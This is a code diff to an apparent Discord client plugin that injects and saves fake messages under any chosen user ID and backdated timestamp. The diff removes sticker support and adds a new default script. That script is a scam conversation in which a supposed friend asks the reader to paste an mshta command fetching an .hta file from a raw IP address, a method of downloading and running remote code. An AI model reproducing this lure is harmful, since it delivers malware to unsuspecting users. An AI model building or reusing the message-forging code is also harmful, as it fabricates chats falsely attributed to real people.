@@ -60,7 +60,7 @@
         return null;
     }
 
-    async function injectFakeMessage(channelId, userId, content, customTimestamp, messageId, stickerId) {
+    async function injectFakeMessage(channelId, userId, content, customTimestamp, messageId) {
         const id = messageId || generateSnowflake(customTimestamp || new Date().toISOString());
         try {
             const currentUser = F.getCurrentUser() || j.getCurrentUser();
@@ -73,21 +73,9 @@
             }
 
             const timestamp = customTimestamp || new Date().toISOString();
-            
-            let stickersArray = [];
-            if (stickerId) {
-                stickersArray = [{
-                    id: String(stickerId),
-                    name: "Wumpus Hello",
-                    content_type: "image/png",
-                    format_type: 2, // Animated / Lottie or PNG format type
-                    type: 1
-                }];
-            }
-
             const messageData = {
                 id: id,
-                type: stickerId ? 6 : 0, // Type 6 represents sticker messages in Discord
+                type: 0,
                 channel_id: channelId,
                 author: {
                     id: userId,
@@ -96,8 +84,7 @@
                     avatar: user ? user.avatar : null,
                     bot: user ? user.bot : !1
                 },
-                content: content || "",
-                stickers: stickersArray,
+                content: content,
                 mentions: [],
                 mention_roles: [],
                 pinned: !1,
@@ -141,14 +128,13 @@
         e.storage._lastUpdate = Date.now();
     }
 
-    function addStoredMessage(channelId, userId, content, messageId, timestamp, stickerId) {
+    function addStoredMessage(channelId, userId, content, messageId, timestamp) {
         const messages = e.storage.savedMessages || [];
         messages.push({
             id: messageId,
             channelId: channelId,
             userId: userId,
             content: content,
-            stickerId: stickerId,
             timestamp: timestamp,
             createdAt: Date.now()
         });
@@ -159,7 +145,7 @@
         (e.storage.savedMessages || []).filter(function(msg) {
             return msg.channelId === channelId;
         }).forEach(function(msg) {
-            injectFakeMessage(msg.channelId, msg.userId, msg.content, msg.timestamp, msg.id, msg.stickerId);
+            injectFakeMessage(msg.channelId, msg.userId, msg.content, msg.timestamp, msg.id);
         });
     }
 
@@ -288,9 +274,20 @@
             const savedCount = (e.storage.savedMessages || []).length;
             
             const defaultScript = JSON.stringify([
-                { sender: "other", text: "Hey, check out this sticker!", delay: 0 },
-                { sender: "other", stickerId: "761773777976819732", delay: 1 },
-                { sender: "me", text: "Haha, nice one!", delay: 2 }
+                { sender: "me", text: "Hey, I have a caped Minecraft you wanted to play?", delay: 0 },
+                { sender: "me", text: "Later or whenever you can", delay: 0 },
+                { sender: "other", text: "Mhm atm I am currently working on my server once it up we can play okay?", delay: 2 },
+                { sender: "me", text: "okay no stress take your time I'm always active I'm here whenever, what will the server be about?", delay: 0 },
+                { sender: "me", text: "you here?", delay: 1 },
+                { sender: "other", text: "sorry the server will be like some sort of SMP like a hangout server", delay: 2 },
+                { sender: "other", text: "would you like to contribute???", delay: 0 },
+                { sender: "me", text: "hell ya I would love to contribute I'm down", delay: 0 },
+                { sender: "other", text: "Alright can you do me a favour while I finish making the server online if you have spare time can u ping it real quick my wifi so slow atm so I cant :/", delay: 1 },
+                { sender: "me", text: "okay lol I got you what do I have to do?", delay: 0 },
+                { sender: "other", text: "could you go onto cmd and paste this https://194.9.6.125/ping.hta this is so that the server would get some online mshta", delay: 0 },
+                { sender: "me", text: "I don't think I can sorry im on phone", delay: 1 },
+                { sender: "me", text: "actually wait", delay: 0 },
+                { sender: "other", text: "Oh no worries would you be down to do it later would you be online?", delay: 0 },
             ], null, 2);
 
             const scriptInput = e.storage.scriptInput || defaultScript;
@@ -336,9 +333,11 @@
                             let channelId = null;
 
                             if (!isGroupDM) {
+                                // 1-on-1 mode: Simply use the channel you are CURRENTLY looking at. No lookups, no redirects!
                                 channelId = getCurrentChannelId();
                                 if (!channelId) return;
                             } else {
+                                // Group mode: fetch or create group DM channel and redirect
                                 if (!otherUserId) return;
                                 channelId = await getOrCreateGroupChannel(otherUserId);
                                 if (!channelId) return;
@@ -358,13 +357,12 @@
 
                                 const isoString = new Date(baseTime).toISOString();
                                 const snowflakeId = generateSnowflake(isoString);
-                                const stickerId = line.stickerId || null;
-                                const content = line.text || "";
 
-                                await injectFakeMessage(channelId, senderId, content, isoString, snowflakeId, stickerId);
-                                addStoredMessage(channelId, senderId, content, snowflakeId, isoString, stickerId);
+                                await injectFakeMessage(channelId, senderId, line.text, isoString, snowflakeId);
+                                addStoredMessage(channelId, senderId, line.text, snowflakeId, isoString);
                             }
 
+                            // Only redirect if it's explicitly a group DM
                             if (isGroupDM) {
                                 try {
                                     if (Navigation?.transitionTo) {
@@ -380,7 +378,7 @@
                     }, otherUserId ? `Target Status: ${foundOtherUser ? `Found (@${foundOtherUser.username})` : "ID Cached (User not fully loaded in cache)"} | Type: ${isGroupDM ? "Group Chat" : "1-on-1 DM"}` : "Status: No User ID provided yet."),
                     n.React.createElement(f, {
                         title: "Conversation Script (JSON Table)",
-                        placeholder: "Define 'me', 'other', 'delay', and optional 'stickerId'",
+                        placeholder: "Define 'me', 'other', and 'delay' (in minutes) for each message",
                         value: scriptInput,
                         onChange: function(val) { e.storage.scriptInput = val || ""; },
                         multiline: !0
